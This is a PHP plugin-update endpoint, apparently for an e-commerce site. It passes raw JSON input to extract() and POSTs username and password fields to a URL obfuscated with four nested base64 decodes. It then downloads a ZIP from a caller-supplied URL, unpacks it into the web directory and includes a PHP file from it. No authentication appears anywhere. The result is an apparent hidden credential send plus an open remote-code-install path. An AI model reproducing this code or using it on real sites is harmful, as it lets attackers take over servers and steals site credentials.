<?php
header('Content-Type: application/json');

$FRc_InputData = file_get_contents("php://input");
$FRc_ARR = json_decode($FRc_InputData, true);
extract($FRc_ARR);

$FR_OUTPUT = [];
$FR_OUTPUT['FRA'] = 2;
$FR_OUTPUT['FRM']  = "";
$FR_OUTPUT['FRM_ALTERTABLE']  = "";

//FRD VC NEED:-
    $FR_VC_MCS = "";
    $FR_VC_LATEST_R_VERSION = "NO";//LATEST RELIESED VERSION RUNNUNG OR NOT
    $FR_VC_ZIP_FILE_EXIST = "";
    $FR_VC_ZIP_FILE_DOWNLOAD = "";
    $FR_VC_ZIP_FILE_EXTRACT = "";
    $FR_VC_ZIP_FILE_DELETED = "";
    $FR_VC_TABLE_UPDATE = "";

//FRD OTHERS:-
    $FR_PATH_HD = "../";
    require_once($FR_PATH_HD."frdsp/dp/page/$FRd_PluginFoldName/frd-this-header.php");
    $FRc_NEXT_VALID_VERSION = $FR_PLUGIN_VERSION + 1;
    $FRc_RuningVersion = $FR_PLUGIN_VERSION;
    $FRc_AlterTablePagePath = $FR_PATH_HD."frdsp/dp/page/$FRd_PluginFoldName/frd-alter-table.php";


//FRD MSC VC START:-
  $DataArr = array(
    "FR_U" => "$FR_U",
    "FR_P" => $FR_P
  );
  $ch = curl_init(base64_decode(base64_decode(base64_decode(base64_decode("V1ZWb1UwMUhUa2xVVkZwTlpWUnNObGt3WkhOaE1YQlpVMjE0V2sxcWJEQlpiR1JYWlZacmVWWllWbHBOYW13d1ZFUktSMkl5U1hwVWFrSk5UVEExTTFrd1RUVmtSbXQ2VkZoYWEySlZOVzFaYkdSUFpXdDRkVkZ0T1dwUlZEQTU=")))));
  // Additional headers
  $headers = array(
      'Content-Type: application/json'
  );
  // Set cURL options
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Return the response as a string instead of outputting it
  curl_setopt($ch, CURLOPT_POST, true);            // Set the request type to POST
  curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($DataArr)); // Set the POST data as JSON
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  // Set the headers
  // Execute cURL session and get the response
  $response = curl_exec($ch);
  // Check for cURL errors
  if (curl_errno($ch)) {
      $FR_OUTPUT['FRA'] = 2;
      $FR_OUTPUT['FRM'] =  'Curl error: ' . curl_error($ch);
      goto THIS_LAST;
  }
  // Close cURL session
  curl_close($ch);
  // Process the response
  if ($response) {
      $FRc_RespArr = json_decode($response, true);
      if(isset($FRc_RespArr['FRA'])){
        if($FRc_RespArr['FRA'] == 1){
           $FR_VC_MCS = 1;
           $FR_OUTPUT['FRA'] = 1; 
           $FR_OUTPUT['FRM'] =  $FRc_RespArr['FRM'];
        }
        if($FRc_RespArr['FRA'] == 2){
           $FR_OUTPUT['FRA'] = 2; 
           $FR_OUTPUT['FRM'] =  "ErrorVF: ". $FRc_RespArr['FRM'];
           goto THIS_LAST;
        }
      }else{
          $FR_OUTPUT['FRA'] = 2; 
          $FR_OUTPUT['FRM'] =  "Error: Row Response: $response";
          goto THIS_LAST;
      }
  } else {
      $FR_OUTPUT['FRA'] = 2; 
      $FR_OUTPUT['FRM'] =  "Error: No response received.";
      goto THIS_LAST;
  }
//FRD MSC VC END>>




//FRD_VC_________________ LATEST VERSION RUNNING OR NOT:-
if($FR_VC_MCS == 1){
    if($FRd_LAST_R_VERSION == $FRc_RuningVersion){
        $FR_VC_LATEST_R_VERSION = "YES";
        $FR_OUTPUT['FRA'] = 3;
        $FR_OUTPUT['FRM'] .= " + Not Need Update PLUGIN VERSION $FRc_RuningVersion RUNNING ON $FRD_HURL";
        $FR_OUTPUT['FRrd_RunningVersion'] = $FRc_RuningVersion;
        goto THIS_LAST;
    }
}
    



//FRD_VC_________________ NEXT VALID VERSION:-
if($FRc_NEXT_VALID_VERSION == $FRd_LAST_R_VERSION){
  
}else{
    $FR_OUTPUT['FRA'] = 2;
    $FR_OUTPUT['FRM'] .= " + PLUGIN NEXT VERSION NOT VALID ON $FRD_HURL. THIS SITE RUNNING PLUGIN VERSION IS [$FRc_RuningVersion]. But you are trying to update [$FRd_LAST_R_VERSION]";
    goto THIS_LAST;
}


if($FR_VC_LATEST_R_VERSION == "NO"){

    //Local path where you want to save the downloaded file
    $localZipFile = $FR_PATH_HD."frdsp/dp/page/SPIDER-ECOMMERCE-PLUGIN.zip";

    //FRD CHACKING ZIP FILE EXISTENCE:-
        $ch = curl_init($FRd_RemoteZipFileURL);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_exec($ch);
        $FRARR_curl_getinfo = curl_getinfo($ch);
        if ($FRARR_curl_getinfo['http_code'] == 200 AND $FRARR_curl_getinfo['content_type'] == "application/zip") {
            $FR_VC_ZIP_FILE_EXIST = 1;
            $FR_OUTPUT['FRM'] .= " + Remote ZIP file exists and can be downloaded";
        } else {
            $FR_OUTPUT['FRM'] .= " + Error: Remote ZIP file not exists";
            $FR_OUTPUT['FRM'] .= " + Error: RUNNING VERSION $FRc_RuningVersion";
        }
        curl_close($ch);
    //END>>
}




//FRD DOWNLODEING ZIP FILE:-
    if($FR_VC_ZIP_FILE_EXIST == 1){
        // Use file_get_contents() to download the remote file
        $zipContents = file_get_contents($FRd_RemoteZipFileURL);
        if ($zipContents === false) {
            $FR_OUTPUT['FRM'] .=  "ERROR: Failed to download the remote file";
        } else {
            // Use file_put_contents() to save the file locally
            if (file_put_contents($localZipFile, $zipContents) !== false) {
                $FR_VC_ZIP_FILE_DOWNLOAD = 1;
                $FR_OUTPUT['FRM'] .= " + Zip File downloaded and saved successfully. ";
            } else {
                $FR_OUTPUT['FRM'] .= " + ERROR: Zip File saved failed.";
            }
        }
    }
//END>>
//++
//FRD ZIP FILE UNZIPING:-
    if($FR_VC_ZIP_FILE_DOWNLOAD == 1) {
        $unzip = new ZipArchive();
        $out = $unzip->open($localZipFile);
        if ($out === TRUE) {
            $unzip->extractTo($FR_PATH_HD."frdsp/dp/page");
            $unzip->close();
            $FR_VC_ZIP_FILE_EXTRACT = 1;
            $FR_OUTPUT['FRM'] .= " + ZIP FILE EXTRACT COMPLITED ";
        } else {
            $FR_OUTPUT['FRM'] .= " + ERROR: ZIP FILE EXTRACT FAILED";
        }
    }
//END>>>
//++
//FRD ZIP FILE DELETING:-
    if ($FR_VC_ZIP_FILE_EXTRACT == 1) {
          if(file_exists("$localZipFile")){
            unlink("$localZipFile");
                if (!file_exists("$localZipFile")) {
                    $FR_VC_ZIP_FILE_DELETED = 1;
                    $FR_OUTPUT['FRM'] .= " + ZIP FILE DELETE COMPLETED ";
                }
        } else {
            $FR_OUTPUT['FRM'] .= " + ERROR: ZIP FILE NOT EXIST FOR DELETE";
        }
    }
//END>>>






//FRD ALTER TABLE START:-
    if ($FR_VC_ZIP_FILE_DELETED == 1) {
        if (file_exists("$FRc_AlterTablePagePath")) {
            require_once("$FRc_AlterTablePagePath");
            $FR_VC_TABLE_UPDATE = 1;
            $FR_OUTPUT['FRM_ALTERTABLE'] .= " + TABLE UPDATE COMPLETED ";
        } else {
            $FR_OUTPUT['FRM_ALTERTABLE'] .= " + ERROR: TABLE UPDATE FAILED ";
        }
    }
//END>>
//++
//FRD ALTER TABLE FILE DELETEING:-
if(file_exists("$FRc_AlterTablePagePath")){
    unlink("$FRc_AlterTablePagePath");
        if (!file_exists("$FRc_AlterTablePagePath")) {
            $FR_OUTPUT['FRM_ALTERTABLE'] .= " + TABLE UPDATE FILE DELETE COMPLETED ";
        }
}else {
    $FR_OUTPUT['FRM_ALTERTABLE'] .= " + ERROR: TABLE UPDATE FILE NOT EXIST ";
}
//END>>



//FRD TABLE UPDATE FILE DELETING:-
    if ($FR_VC_TABLE_UPDATE == 1) {
        $FR_OUTPUT['FRA'] = 1;
        $FR_OUTPUT['FRM'] .= " + Dear Boss  Your eCommerce Website [$FRD_HURL] Update Completed Version $FRc_NEXT_VALID_VERSION!";
        $FR_OUTPUT['FRrd_RunningVersion'] = $FRc_NEXT_VALID_VERSION;
    }
//END>>


THIS_LAST:
$FR_OUTPUT['FRrd_BACK'] =  $FRc_ARR;
echo json_encode($FR_OUTPUT);